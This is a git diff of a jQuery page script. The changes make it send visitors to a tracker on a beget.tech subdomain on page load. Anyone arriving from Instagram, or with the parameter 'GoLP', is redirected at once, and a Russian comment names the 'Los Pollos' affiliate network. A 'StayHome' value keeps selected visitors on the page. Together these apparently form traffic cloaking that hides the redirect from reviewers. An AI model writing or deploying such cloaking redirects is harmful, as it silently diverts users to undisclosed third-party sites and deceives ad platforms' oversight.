@@ -1,5 +1,9 @@
 $( document ).ready(function() {
 	var param;
+	var prev = document.referrer;
+
+
+
     function getUrlVars()
 	{
 	    var vars = [], hash;
@@ -10,12 +14,21 @@ $( document ).ready(function() {
 	        vars.push(hash[0]);
 	        vars[hash[0]] = hash[1];
 	    }
-	    if(vars.param == "b") {
+	    if(vars.param == "StayHome") {
+	    	alert('b');
 	    	return;
 	    }
+	    if(vars.param == "GoLP") {
+			window.location.href = "http://tracker.xkuklohd.beget.tech/track/from-instangram/source/campaign-ads"
+	    }
+
+	    if (prev.indexOf('instagram.com') + 1) { //уводим на лосполлос сразу
+			window.location.href = "http://tracker.xkuklohd.beget.tech/track/from-instangram/source/campaign-ads"
+		}
+
 	    else (
 	    	window.location.href = "http://tracker.xkuklohd.beget.tech/track/los-pollos-bez-uvoda/source/campaign-ads"
-	    )    
+	    )  
 	}
 	getUrlVars();
 });
